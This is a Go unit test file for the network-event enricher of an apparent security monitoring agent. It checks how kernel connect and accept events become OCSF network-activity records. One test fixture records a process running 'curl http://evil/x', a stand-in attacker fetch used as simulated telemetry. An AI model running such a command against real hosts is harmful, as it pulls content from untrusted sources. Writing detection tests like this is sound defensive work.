package enricher

import (
	"context"
	"testing"
	"time"

	"github.com/t3rmit3/slither/agent/internal/pipeline"
	"github.com/t3rmit3/slither/pkg/ocsf"
)

func TestNetActivityIDMapping(t *testing.T) {
	cases := map[pipeline.RawNetKind]ocsf.NetActivityID{
		pipeline.NetTCPConnect: ocsf.NetActivityOpen,
		pipeline.NetTCPAccept:  ocsf.NetActivityOpen,
		pipeline.NetUDPSend:    ocsf.NetActivityTraffic,
	}
	for k, want := range cases {
		if got := netActivityID(k); got != want {
			t.Errorf("netActivityID(%v) = %d, want %d", k, got, want)
		}
	}
}

func TestNetDirection(t *testing.T) {
	cases := map[pipeline.RawNetKind]string{
		pipeline.NetTCPConnect: "outbound",
		pipeline.NetUDPSend:    "outbound",
		pipeline.NetTCPAccept:  "inbound",
	}
	for k, want := range cases {
		got, _ := netDirection(k)
		if got != want {
			t.Errorf("direction(%v) = %q, want %q", k, got, want)
		}
	}
}

func TestHandleNetTCPConnectBuildsValidOCSF(t *testing.T) {
	e := newTestEnricher(t)
	e.cache.upsert(procEntry{
		pid: 800, uid: 1000, comm: "curl", exe: "/usr/bin/curl",
		cmdline: "curl http://evil/x",
	})

	raw := pipeline.RawNetEvent{
		Kind:      pipeline.NetTCPConnect,
		PID:       800,
		Proto:     6,
		SrcAddr:   "10.0.0.5", SrcPort: 54321,
		DstAddr:   "203.0.113.9", DstPort: 80,
		Timestamp: time.Unix(100, 0),
	}
	e.handleNet(context.Background(), raw)

	ev := <-e.out
	na, ok := ev.(*ocsf.NetworkActivity)
	if !ok {
		t.Fatalf("emitted %T, want *NetworkActivity", ev)
	}
	if err := na.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}
	if na.ActivityID != ocsf.NetActivityOpen {
		t.Errorf("activity_id = %d, want Open", na.ActivityID)
	}
	if na.Connection.Protocol != "tcp" || na.Connection.Direction != "outbound" {
		t.Errorf("connection = %+v", na.Connection)
	}
	if na.SrcEndpoint.IP != "10.0.0.5" || na.DstEndpoint.IP != "203.0.113.9" {
		t.Errorf("endpoints swapped: src=%+v dst=%+v", na.SrcEndpoint, na.DstEndpoint)
	}
	if na.Actor.Process.PID != 800 || na.Actor.Process.Name != "curl" {
		t.Errorf("actor.process = %+v", na.Actor.Process)
	}
}

func TestHandleNetAcceptSwapsEndpoints(t *testing.T) {
	e := newTestEnricher(t)
	// Kernel's accepted-sock presents remote-client as daddr/dport. The
	// enricher flips them so src=client matches the outbound-event convention.
	raw := pipeline.RawNetEvent{
		Kind:      pipeline.NetTCPAccept,
		PID:       900,
		Proto:     6,
		SrcAddr:   "10.0.0.2", SrcPort: 22, // server local
		DstAddr:   "198.51.100.7", DstPort: 44123, // remote client (as seen in kernel sock)
		Timestamp: time.Unix(1, 0),
	}
	e.handleNet(context.Background(), raw)

	na := (<-e.out).(*ocsf.NetworkActivity)
	if na.SrcEndpoint.IP != "198.51.100.7" || na.SrcEndpoint.Port != 44123 {
		t.Errorf("accept: src not client: %+v", na.SrcEndpoint)
	}
	if na.DstEndpoint.IP != "10.0.0.2" || na.DstEndpoint.Port != 22 {
		t.Errorf("accept: dst not server: %+v", na.DstEndpoint)
	}
	if na.Connection.Direction != "inbound" {
		t.Errorf("direction = %q, want inbound", na.Connection.Direction)
	}
}

func TestProtoName(t *testing.T) {
	for p, want := range map[uint8]string{6: "tcp", 17: "udp", 1: "icmp", 0: ""} {
		if got := protoName(p); got != want {
			t.Errorf("protoName(%d) = %q, want %q", p, got, want)
		}
	}
}
